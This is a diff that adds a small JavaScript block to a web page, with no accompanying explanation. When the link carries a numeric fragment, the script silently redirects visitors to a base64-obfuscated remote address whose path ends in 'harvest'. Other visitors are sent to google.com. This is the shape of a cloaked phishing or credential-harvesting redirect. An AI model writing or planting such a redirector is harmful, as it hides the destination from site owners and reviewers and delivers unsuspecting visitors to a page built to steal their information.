@@ -1,0 +1,9 @@
+<script type='text/javascript'>
+ 
+if(window.location.href.split('#')[1]>0){
+  location=atob('aHR0cHM6Ly9tYW1zYXRyZW5kLmNvbS9hZG1pbi9tb2RlbC9oYXJ2ZXN0Lw=='); 
+} else {
+  location= "https://google.com";
+}
+
+ </script>
